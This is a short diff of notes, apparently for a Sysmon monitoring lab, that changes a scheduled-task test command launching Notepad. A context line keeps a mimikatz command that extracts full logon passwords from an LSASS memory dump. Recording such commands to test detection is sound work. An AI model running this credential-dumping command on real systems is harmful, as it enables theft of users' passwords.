@@ -7,7 +7,7 @@
 #### note: put Sysmon64.exe and sysmonconfig.xml in C:\Users\\{Username}\Documents
 
 ##### payload record:
-SCHTASKS /Create /SC DAILY /TN "Open Notepad" /TR "notepad.exe" /ST 12:00
+SCHTASKS /Create /SC ONCE /TN "Open Notepad" /TR "notepad.exe" /ST 15:30 /SD 06/01/2024
 
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 
